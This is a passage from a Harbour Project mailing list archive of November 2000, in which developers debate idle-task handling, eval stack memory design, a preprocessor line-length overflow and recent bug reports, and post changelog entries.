In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEIDDHAA.ron@profit-master.com>; from ron@profit-master.com on Sat, Nov 25, 2000 at 03:40:15PM -0800
References: <20001125194234.H26952@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKOEIDDHAA.ron@profit-master.com>
Message-ID: <20001127095131.N26952@hagbard.davep.org>

On Sat, Nov 25, 2000 at 03:40:15PM -0800, Ron Pinkas wrote:
> > On Fri, Nov 24, 2000 at 08:05:51PM -0800, Ron Pinkas wrote:
> >
> > > 3. I don't believe in reinventing the wheel, especially, not under sever
> > > time constraints. I want to see 1.0 ASAP. I am not in favor of
> > > re-implementing such critical piece (unless un-avoidable)
> > > before we release
> > > 1.0.
> >
> > What severe time constraints are being imposed on harbour and who is
> > imposing them?
> 
> None! Thank you for clearing this up, I simply forgot.

Huh? I didn't clear anything up, I asked a question. You made an interesting
comment and I'm wondering about the facts behind this comment.

> I will soon append my will with detailed instructions for my boys Tom (8)
> and Dean (5.5), on how to download and build Harbour incase we are not
> done in my life time.

Hopefully you'll actually donate these detailed instructions to the project
so as to aid everyone's offspring.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Mon Nov 27 05:32:04 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Mon Nov 27 05:32:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <200011261738_MC2-BC20-1F05@compuserve.com>
Message-ID: <3A223FA2.31487.3F5298E@localhost>

On 26 Nov 2000, at 17:37, John Skelton wrote:

> Temporarily ignoring who made what change, all I'm asking is that we
> stop using a complete misnomer (= wrong name).  They're not "idle
> tasks".

  OK.
  The previous code was a simple interaction of three modules: 
keystroke handling, idle tasks handling, garbage collecting.
The keystroke module signalled to an idle module that it can do 
something more useful then non-productive loop. One of idle tasks was 
calling a garbage collection.
  All idle tasks handling internals were hidden inside this module. 
All garbage collecting logic was hidden inside a garbage collector 
module.  
  Just simple fire and forget logic based on modularization.

  What we have now?
The keystroke handling manages both idle tasks handling and garbage 
collecting. Thus it needs additional information how both these 
modules work. This is what I call a complex dependencies. These 
dependencies are so complex that this handling have bugs inside. In 
some cases both garbage collecting and idle tasks will be not called 
at all. In other cases the last task can be not called at all.

  What we have gained with this change? 
The broken modularization and hidden bugs. And this is true 
regardless how we call these idle tasks. However if they are here 
then they should be handled correctly. Sure Ron can probably fix 
these bugs at a cost of even more complex code creating a bomb that 
will explode some time later. It is not my fault that most of such 
broken rules are created by Ron - but I will disagree always with 
such practice.

> Personally I think they should not exist, because we should have a
> proper way to provide what appears to be a needed facility.  But
> however the facility is provided "idle" is what these things are
> _not_, so let's not call them "idle".

  I disagree. During a keystroke checking an application is in non-
productive state - it is an idle state. We can use this time for 
something more productive. Regardless of a purpose of such tasks we 
have to handle them correctly.

Regards, Ryszard


From harbour@lists.harbour-project.org  Mon Nov 27 06:05:03 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Mon Nov 27 06:05:03 2000
Subject: [Harbour] Big array won't compile
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEINDHAA.ron@profit-master.com>
Message-ID: <NCBBJKNMIDPJNLJCHCHIEEKFFJAA.harbour@winfakt.com>

Ron,

> "with latest harbour" - Did it compile before???
Did not test it.

> This appears to be some buffer/stack overflow in Bison, and can't be
> compiled by Clipper either.
> It seems this line is just too long. I've changed SimpLex
> NUMERALS_PER_LINE
> to just below the point where the parser fails, so that the user can at
> least get a reasonable error "Error SLX0002 Too many numerals in
> line <X>".
> I'll search to see if we can catch this condition in Bison and how?
> Simple fix might be to split it into 2 lines and later consolidate the 2
> arrays.
Did it this way as a workaround, but I thought I need to report this
behaviour.

regards,

Patrick Mast
www.Patrick.Be.kz


From harbour@lists.harbour-project.org  Mon Nov 27 06:05:43 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Mon Nov 27 06:05:43 2000
Subject: [Harbour] Big array won't compile
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKEIODHAA.ron@profit-master.com>
Message-ID: <NCBBJKNMIDPJNLJCHCHIGEKFFJAA.harbour@winfakt.com>

Ron,

> > This appears to be some buffer/stack overflow in Bison, and can't be
> > compiled by Clipper either.
> Actually, it is a PP buffer overflow! I'll try to add an Error Message.
Can it be fixed?
So we have a limit in linelenght to compile?

regards,

Patrick Mast
www.Patrick.Be.kz


From harbour@lists.harbour-project.org  Mon Nov 27 08:04:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Mon Nov 27 08:04:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random  gpfs)
In-Reply-To: <200011261738_MC2-BC20-1F03@compuserve.com>
Message-ID: <3A226AC5.10574.49DAA13@localhost>

On 26 Nov 2000, at 17:37, John Skelton wrote:

> But not for the stack. :-(
> 
> "Harbour can use this memory too."
> 
> Yes.

  Clipper cannot use such extented memory for stack but Harbour can 
use it. 

> "Why do you want to limit usage of harbour in DOS?"
> 
> I don't see why Harbour-with-DOS-Extender should have any particular
> limits.  It depends on how its stack management is done.  If the DOS
> Extender makes it hard to have a stack done the same way other systems
> allow, so be it.  Something tuned to the Extender's limitations can be
> done, if anyone cares enough to tune it specially.

  Until this moment we have avoided the situation when some critical 
part of harbour depends on OS specific feature. This allows to 
compile that the core of harbour on most new platforms with no 
additional research and coding (with the one exception of symbols 
intialization support which is a compiler specific feature). Sure, 
some things like screen support, file system support have to be 
rewritten - but this is the nature of multiplatform code.
  It is not a good solution when the core code needs tunning by the 
user for his platform while there is a solution that fits all 
platforms. Harbour should first deliver solutions that will work on 
all platforms leaving OS-specific tuning for later.
  If we are shifting our goals into a tool that will be tuned for 
some third party developers then sorry, I will not go this route 
because I think that this will be the end of harbour. I think that we 
have left Victor already due such unforcements.

> The main thing is that it is important to provide clean and fast
> stack access and management, which does not appear possible using most
> (all?) of the other techniques so far suggested.  In effect, those
> techniques would impose a slow and/or bloated and/or awkward stack on

We know nothing about the proposed virtual memory management. We cannot
predict when memory commiting will fail. We cannot predict how big buffer
have to be allocated. We cannot predict under which condition the memory 
buffer will be not allocated at all. We cannot predict how costly is 
an expansion of reserved memory. Yet you are assuming that it will be 
better and faster solution.

> _all_ platforms.  I don't see that as better than what's now
> suggested, which is especially good on higher-end platforms at the
> same time as being pretty good on the other platforms.

  I don't understand it. How virtual memory manager can be a good 
solution on other platforms that doesn't support it?

> If you've an even better idea, please explain. :-)

  You know already this idea :)

Regards, Ryszard

From harbour@lists.harbour-project.org  Mon Nov 27 08:09:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Mon Nov 27 08:09:02 2000
Subject: [Harbour] latest code has problems
Message-ID: <3A225CB3.F537E281@libero.it>

Questo è un messaggio a più sezioni in formato MIME.
--------------CC857C2E2271F7CF7AD7BD58
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Hi,

latest code has introduced some new problem. Build dbu and then try to
open the attached file, you'll get an error on exit (hb_xfree called
with invalid pointer).

If you press F1 then Enter you'll get a gpf.

regards.


-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia
--------------CC857C2E2271F7CF7AD7BD58
Content-Type: text/plain; charset=iso-8859-1;
 name="ATC.DBF"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline;
 filename="ATC.DBF"

=03d=0B=1B=03=00=00=00b=00D=00=00=00=00=00=00=00=00=00=00=00=00=00=00=00=00=
=00=00=00=00=00CODICE=00=15_?PCxp=CA
=07=00ru5=123_=08=000=D6=82uM=05DESCRI=00=15_?PCxp=CA
<=00ru5=123_=08=000=D6=82uM=05
=00*1      A                                                            2=
      B                                                           *3     =
 C                                                           =1A
--------------CC857C2E2271F7CF7AD7BD58--


From harbour@lists.harbour-project.org  Mon Nov 27 08:26:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Mon Nov 27 08:26:03 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random  gpfs)
References: <3A226AC5.10574.49DAA13@localhost>
Message-ID: <3A2260A1.33ECD317@libero.it>

Ryszard,

A stack based on delayed committing of memory (that is reserving an
address space larger than initially needed memory) is a tecnique used by
a lot of software. On OS/2 standard stack management of every process is
based on such a tecnique and it works fairly well.

I've developed a mmap() emulator for OS/2 (which has not mmap()) and it
uses this tecnique extensively. It works like a charm.

When your program starts it allocates a chunk of addresses (say 8Mb) but
does not reserve memory. When you need memory you ask your OS to "fill"
some of this address space with real memory. 

If you don't need to enlarge you swap file this filling is very fast. It
does fail only if you try to enlarge it past its maximum size.

It needs a SO with such a sevice (and surely DOS has not this) but all
SO with virtual memory have to have such services.

It will have a second (more important for me) advantage: we won't need
to change existing (and already debugged code). We need only to change a
couple of functions (if we want to use it only for stack management) or
add a little (really little) layer if we want to use this tecnique for
other extensible structures (Dynamic Symbol Table comes to my mind
first).

It can be done in a couple of hours, won't break existing code, won't
cause any new problem to DOS (which is the only platform which has not
virtual memory). We don't have handhelp PCs supported (we barely support
win32 at this time, look at linux port lacking something as easy and
fundamental as cpu releasing code).

Yes, a list (which is my other suggested solution) doesn't need any
virtual memory service, but does need a lot of changes to existing code.
I fear this will introduce a large amount of bugs hard to find. Maybe
not. But can you assure it?

regards.


Ryszard Glab ha scritto:
> 
> On 26 Nov 2000, at 17:37, John Skelton wrote:
> 
> > But not for the stack. :-(
> >
> > "Harbour can use this memory too."
> >
> > Yes.
> 
>   Clipper cannot use such extented memory for stack but Harbour can
> use it.
> 
> > "Why do you want to limit usage of harbour in DOS?"
> >
> > I don't see why Harbour-with-DOS-Extender should have any particular
> > limits.  It depends on how its stack management is done.  If the DOS
> > Extender makes it hard to have a stack done the same way other systems
> > allow, so be it.  Something tuned to the Extender's limitations can be
> > done, if anyone cares enough to tune it specially.
> 
>   Until this moment we have avoided the situation when some critical
> part of harbour depends on OS specific feature. This allows to
> compile that the core of harbour on most new platforms with no
> additional research and coding (with the one exception of symbols
> intialization support which is a compiler specific feature). Sure,
> some things like screen support, file system support have to be
> rewritten - but this is the nature of multiplatform code.
>   It is not a good solution when the core code needs tunning by the
> user for his platform while there is a solution that fits all
> platforms. Harbour should first deliver solutions that will work on
> all platforms leaving OS-specific tuning for later.
>   If we are shifting our goals into a tool that will be tuned for
> some third party developers then sorry, I will not go this route
> because I think that this will be the end of harbour. I think that we
> have left Victor already due such unforcements.
> 
> > The main thing is that it is important to provide clean and fast
> > stack access and management, which does not appear possible using most
> > (all?) of the other techniques so far suggested.  In effect, those
> > techniques would impose a slow and/or bloated and/or awkward stack on
> 
> We know nothing about the proposed virtual memory management. We cannot
> predict when memory commiting will fail. We cannot predict how big buffer
> have to be allocated. We cannot predict under which condition the memory
> buffer will be not allocated at all. We cannot predict how costly is
> an expansion of reserved memory. Yet you are assuming that it will be
> better and faster solution.
> 
> > _all_ platforms.  I don't see that as better than what's now
> > suggested, which is especially good on higher-end platforms at the
> > same time as being pretty good on the other platforms.
> 
>   I don't understand it. How virtual memory manager can be a good
> solution on other platforms that doesn't support it?
> 
> > If you've an even better idea, please explain. :-)
> 
>   You know already this idea :)
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Mon Nov 27 08:29:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Mon Nov 27 08:29:01 2000
Subject: [Harbour] latest code has problems
References: <3A225CB3.F537E281@libero.it>
Message-ID: <3A22613C.147D2A61@libero.it>

Questo è un messaggio a più sezioni in formato MIME.
--------------E051D1D91BF018D545D1F60F
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Sorry,

attachement is corrupted, try this one.

Maurilio Longo ha scritto:
> 
> Hi,
> 
> latest code has introduced some new problem. Build dbu and then try to
> open the attached file, you'll get an error on exit (hb_xfree called
> with invalid pointer).
> 
> If you press F1 then Enter you'll get a gpf.
> 
> regards.
> 
> --
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia
> 
>   ------------------------------------------------------------------------
> d<

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia
--------------E051D1D91BF018D545D1F60F
Content-Type: application/x-zip-compressed;
 name="atc.zip"
Content-Transfer-Encoding: base64
Content-Disposition: inline;
 filename="atc.zip"

UEsDBBQAAAAIAHpYeymHH6MRUwAAAC8BAAAHAAAAQVRDLkRCRmNO4ZZmZmBgSGJwYcAGnP1d
PJ1dGUTj7QOcKwpO8bIzFJWaChnHczAYXGsq9WV1cQ12DvJEyNugyfMyaBkqgIGjAgXACEI5
UWCEljGEdqbADCkAUEsBAhQGFAAAAAgAelh7KYcfoxFTAAAALwEAAAcAAAAAAAAAAAAgALaB
AAAAAEFUQy5EQkZQSwUGAAAAAAEAAQA1AAAAeAAAAAAA
--------------E051D1D91BF018D545D1F60F--


From harbour@lists.harbour-project.org  Mon Nov 27 11:18:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Mon Nov 27 11:18:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-27 17:14 GMT+1
Message-ID: <3A2288FB.212CD525@libero.it>

2000-11-27 17:14 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
   * source/rtl/tbrowse.prg
      * changed ::RelativePos into ::LastRetrieved (seems more
descriptive to me)

2000-11-27 17:07 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
   * source/rtl/tbrowse.prg
      ! fixed ::Stabilize() method (problems when past eof())

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Mon Nov 27 12:26:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Mon Nov 27 12:26:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011271224_MC2-BC30-EE6B@compuserve.com>

Ryszard,

JS> Personally I think they should not exist, because we should have a
JS> proper way to provide what appears to be a needed facility.  But
JS> however the facility is provided "idle" is what these things are
JS> _not_, so let's not call them "idle".

"I disagree. During a keystroke checking an application is in non-
productive state - it is an idle state. We can use this time for =

something more productive. Regardless of a purpose of such tasks we =

have to handle them correctly."

That is _platform dependent_.  It would not apply with, for example,
a GUI Windows app.  Such an app will never call INKEY (or related
wait state thing).

However, people with GUI winapps may want to have low-priority
background activities (or the "events" also mentioned), even if they
are implemented crudely.  So, if Harbour is to have such things they
should be added properly.

BTW, In any decent OS, it is the OS which will deal with things like
detecting and buffering keystrokes.  It is a kind of procedural
hangover that Clipper & now Harbour even have a way to be "keystroke
checking".  Also, the Harbour app may be "in non-productive state",
but generally the OS is _not_, and you do it no favours by checking
in a loop the way you refer to.  (You are no doubt aware of the
problems & patches needed with Clipper and OS/2, NT, etc.)  You also
interfere with low-power appliances.  Any such code should definitely
be separated out from the main body of Harbour and its use strongly
discouraged.

John.

From harbour@lists.harbour-project.org  Mon Nov 27 12:26:40 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Mon Nov 27 12:26:40 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011271224_MC2-BC30-EE6C@compuserve.com>

Ryszard,

"malloc-calloc-free... implemented in every ANSI C compatible compiler.
  Functions for managing virtual memory are non-standard and OS-
specific. This means that they are fragile for any changes made by a =

supplier of these functions."

Not really.  It's probably more likely that MS will break their C
compiler as that they'll break the Virtual APIs in Windows.

IAC, as I pointed out, Harbour has many non-ANSI functions in it.  I
see no particular problem with getting a good stack implementation in
return for a small amount more of such functions.

For that matter, a 1MB stack would be fine by me.  It's the current
situation which is a problem because it isn't good enough.

"Additionally, these functions are not tested widely"

You're kidding, right?  What evidence do you have for that claim?

"OS specific solution can give better performance however at =

the cost of decreased stability"

Again, what evidence do you have?

"But we need the vialable solution that will work on all suported =

platforms too. The linked list of blocks is the only such solution."

It's a slow and bloated solution.  I don't regard it as viable.  OTOH,
I don't intend to use it. :-)

"Then it is clear that stack handling code have to be removed from =

VM code into a separate file"

If that's the right way, let's do it that way.

"hb_param() have to be moved from EXTEND API into this new stack
module"

As long as it has sensible semantics, I don't care if it moves to a
separate module.

John.

From harbour@lists.harbour-project.org  Mon Nov 27 12:48:00 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 12:48:00 2000
Subject: [Harbour] Win32 Sleep/SleepEx
In-Reply-To: <001d01c054fb$90ca10a0$b671fea9@QUARRY>
References: <200011211830.eALIUnG08319@thor.parrett.net>
Message-ID: <200011271747.eARHldG27092@thor.parrett.net>

** Reply to message from "Paul Tucker" <ptucker@sympatico.ca> on Wed,
22 Nov 2000 22:14:59 -0500

> Windows applications should yield by calling the WaitMessage function

Harbour is not a Windows application, unless using an add-on, such as
FiveWin, so I don't see how Harbour would be able to use the WaitMessage
function, because from what I understand, Console mode applications
don't get any Windows messages (or have I misunderstood something about
Console mode applications).
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 12:52:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 12:52:02 2000
Subject: [Harbour] Mailing list info on the Harbour page (Patrick)
In-Reply-To: <NCBBJKNMIDPJNLJCHCHIGEGEFJAA.harbour@winfakt.com>
References: <011301c04e20$e4278890$0a0ac8c8@VECWS1>
Message-ID: <200011271751.eARHpTG27407@thor.parrett.net>

** Reply to message from "Patrick Mast, Harbour" <harbour@winfakt.com> on Thu, 23 Nov 2000 15:57:01 +0100

> I was at Comdex past week,

I figured as much when I got your postcard from Las Vegas.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 12:58:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Mon Nov 27 12:58:01 2000
Subject: [Harbour] ChangeLog 2000-11-27 18:55 UTC+0100
Message-ID: <3A22AFC5.17394.5AB2FA5@localhost>

    *source/rtl/idle.c
    *source/rtl/inkey.c
        * Added support for CPU releasing in U*ix

Regards, Ryszard

From harbour@lists.harbour-project.org  Mon Nov 27 13:15:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 13:15:03 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEGFDHAA.ron@profit-master.com>
References: <3A1D792E.18D354@libero.it>
Message-ID: <200011271814.eARIEuG29680@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Thu,
23 Nov 2000 12:34:39 -0800

> I don't think it is reasonable to assume that an Idle Block
> *must* be reevaluated *repeatedly* per single Wait State.

There is no such thing as a "single Wait State". Each invocation of
hb_idleState is a *new* wait state. If an idle process doesn't want or
need to be executed on every wait state, then that idle process needs to
have code to limit how often it gets executed. Harbour's idle state
processor should not attempt to make that decision.

> Right, but we are not even close to perfection here, because, if I as a
> developer didn't mean for my Idle Block to be repeatedly executed per Wait
> State, I had no way of doing so.

Sure you did. For example, you can have a counter to only execute every
so many calls. Or you can call SECONDS() to ensure that it doesn't
execute more than once during an arbitrary time period.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 13:19:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 13:19:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <04c801c05597$ae451700$0a0ac8c8@VECWS1>
References: <LOBBKAFMMFGJIKLMEPAKGEGEDHAA.ron@profit-master.com> <3A1D8154.288B7DA6@libero.it> <048501c0558f$fe1ea780$0a0ac8c8@VECWS1> <3A1D88EC.6B6E1C13@libero.it>
Message-ID: <200011271818.eARIIqG29953@thor.parrett.net>

** Reply to message from "Victor Szakats" <vector@mail.matav.hu> on
Thu, 23 Nov 2000 22:52:30 +0100

> I mean it's the same if I'd call my bunch of idle functions just 
> before every inkey() calls. What is that good for at all ?

It is good for absolutely nothing!
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 13:22:03 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Mon Nov 27 13:22:03 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random  gpfs)
In-Reply-To: <3A2260A1.33ECD317@libero.it>
Message-ID: <3A22B549.23308.5C0BCE0@localhost>

On 27 Nov 2000, at 14:24, Maurilio Longo wrote:

> It can be done in a couple of hours, won't break existing code, won't
> cause any new problem to DOS (which is the only platform which has not
> virtual memory). We don't have handhelp PCs supported (we barely
> support win32 at this time, look at linux port lacking something as
> easy and fundamental as cpu releasing code).

  And will not solve a problem of the eval stack growth. This way 
Harbour in DOS and other currently unsupported systems will not 
handle dynamic stack. 
  Did we changed our goals to develop harbour on one specific target 
platform? Is it the road where we are heading?
  Anyway, I am not in a position to do such OS specific changes. I 
can separate stack handling from VM code as I outlined previously.
  
Regards, Ryszard

From harbour@lists.harbour-project.org  Mon Nov 27 13:26:01 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 13:26:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas<ron@profit-master.com>
In-Reply-To: <200011231758_MC2-BBFF-338A@compuserve.com>
Message-ID: <200011271825.eARIPSG30730@thor.parrett.net>

** Reply to message from John Skelton <John_Skelton@compuserve.com> on
Thu, 23 Nov 2000 17:58:38 -0500

> That word "idle" is surely a hint.  People appear to be talking about
> at least 2 things: background (low priority) processing and true idle
> time.  It may be hard to reconcile these if only one term is used to
> mean both of them!

The entire purpose of idle time and wait states in Harbour is for doing
low priority background processing (i.e., simulating having real threads
by running something when Harbour is waiting for user input).
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 13:29:01 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Mon Nov 27 13:29:01 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011271328_MC2-BC3F-FD44@compuserve.com>

Ryszard,

"Until this moment we have avoided the situation when some critical =

part of harbour depends on OS specific feature"

Your view isn't the same as mine.  I see lots of dependencies.  IAC,
as I have said there's nothing to stop there being a non-OS dependent
stack implementation as well as ones which are far better but OS-
dependent.

"... this is the nature of multiplatform code"

So is getting a good stack subsystem.

"It is not a good solution when the core code needs tunning by the =

user for his platform while there is a solution that fits all =

platforms."

That's untrue in the case where the "solution that fits all platforms"
is too slow and/or bloated (and/or with other serious problems) to be
usable.

"If we are shifting our goals into a tool that will be tuned for =

some third party developers"

I have not suggested that.  I _have_ suggested that a linked-list
stack will be unsuitable.  My guess is that it will be unsuitable
except on large and fast systems.  I think that would be bad.

> The main thing is that it is important to provide clean and fast
> stack access and management, which does not appear possible using most
> (all?) of the other techniques so far suggested.  In effect, those
> techniques would impose a slow and/or bloated and/or awkward stack on

"We know nothing about the proposed virtual memory management."

Not true.

"We cannot predict when memory commiting will fail. We cannot predict
how big buffer have to be allocated. We cannot predict under which
condition the memory buffer will be not allocated at all. We cannot
predict how costly is an expansion of reserved memory. Yet you are
assuming that it will be better and faster solution."

IMO you are either ignorant about modern VM OSes or trying to be
awkward.

"How virtual memory manager can be a good =

solution on other platforms that doesn't support it?"

I didn't say that.

> If you've an even better idea, please explain. :-)

"You know already this idea :)"

But it's not better.  It's far worse!

John.

From harbour@lists.harbour-project.org  Mon Nov 27 13:30:04 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 13:30:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEGNDHAA.ron@profit-master.com>
References: <050801c055a5$e5c0da80$0a0ac8c8@VECWS1>
Message-ID: <200011271829.eARITPG31115@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Thu,
23 Nov 2000 16:11:40 -0800

> 1. Do we want to allow the developer to specify that such Idle Block is to
> be executed once per Wait State?
> 2. Should we default to once or repeating per Wait State?

Should you manage to somehow shove this silliness down our throats,
then the default should be execute *every* time the idle processor is
called. After all, there IS NO SUCH THING as a "wait state" in Harbour.

> 3. If we do allow such choice, is global setting ok, or do we want it per
> Block?

The programmer can already limit how often a background "idle task"
actually does its processing, so why is this complex layer being added
to the idle processor?
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 13:34:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 13:34:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEGNDHAA.ron@profit-master.com>
References: <050801c055a5$e5c0da80$0a0ac8c8@VECWS1>
Message-ID: <200011271833.eARIX5G31471@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Thu,
23 Nov 2000 16:11:40 -0800

> Since I personally, never used such mechanism, 

Then what the <censored> are you doing trying to force your arrogant
opinion of how it should work down our throats? Leave this to people who
have actually implemented idle-time background processing and understand
the concept!
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 13:49:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 13:49:02 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011271814.eARIEuG29680@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEJEDHAA.ron@profit-master.com>

David,

> There is no such thing as a "single Wait State". Each invocation of
> hb_idleState is a *new* wait state. If an idle process doesn't want or
> need to be executed on every wait state, then that idle process needs to
> have code to limit how often it gets executed. Harbour's idle state
> processor should not attempt to make that decision.

Sure there is. At the Harbour Application Level, each Inkey(...) is a
"single Wait State"!

What is wrong with allowing such block to Run once per Inkey(), if the
developer so desires?

Ron


From harbour@lists.harbour-project.org  Mon Nov 27 13:56:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 13:56:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011271829.eARITPG31115@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEJFDHAA.ron@profit-master.com>

David,

> Should you manage to somehow shove this silliness down our throats,
> then the default should be execute *every* time the idle processor is
> called. After all, there IS NO SUCH THING as a "wait state" in Harbour.

Shove what down your throat? What in the world are you talking about?

> The programmer can already limit how often a background "idle task"
> actually does its processing, so why is this complex layer being added
> to the idle processor?

Can you please point to "this complex layer"?

Ron

From harbour@lists.harbour-project.org  Mon Nov 27 13:57:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 13:57:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <3A2185D6.B43DEE0B@libero.it>
References: <LOBBKAFMMFGJIKLMEPAKAEIKDHAA.ron@profit-master.com>
Message-ID: <200011271856.eARIufG01232@thor.parrett.net>

** Reply to message from Maurilio Longo <maurilio.longo@libero.it> on
Sun, 26 Nov 2000 22:51:18 +0100

> Please note that I bet we won't see handheld PCs running harbour any
> time soon :-))

But only because it is currently impossible to build a working set of
16bit Harbour libraries.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 14:00:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 14:00:03 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Randomgpfs)
In-Reply-To: <200011261738_MC2-BC20-1F03@compuserve.com>
Message-ID: <200011271859.eARIxcG01462@thor.parrett.net>

** Reply to message from John Skelton <John_Skelton@compuserve.com> on
Sun, 26 Nov 2000 17:37:36 -0500

> But not for the stack. :-(

Is the 64K maximum stack size limit for 16bit DOS programs present in
32bit protected mode? (I've never tried to use a stack larger than 64KB.)
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 14:12:01 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 14:12:01 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKEJEDHAA.ron@profit-master.com>
References: <200011271814.eARIEuG29680@thor.parrett.net>
Message-ID: <200011271910.eARJAxG02347@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Mon,
27 Nov 2000 10:50:45 -0800

> What is wrong with allowing such block to Run once per Inkey(), if the
> developer so desires?

If you want something to run once per Inkey(), then an existing way to
do that is to write a wrapper function, possibly called MyInkey(), and
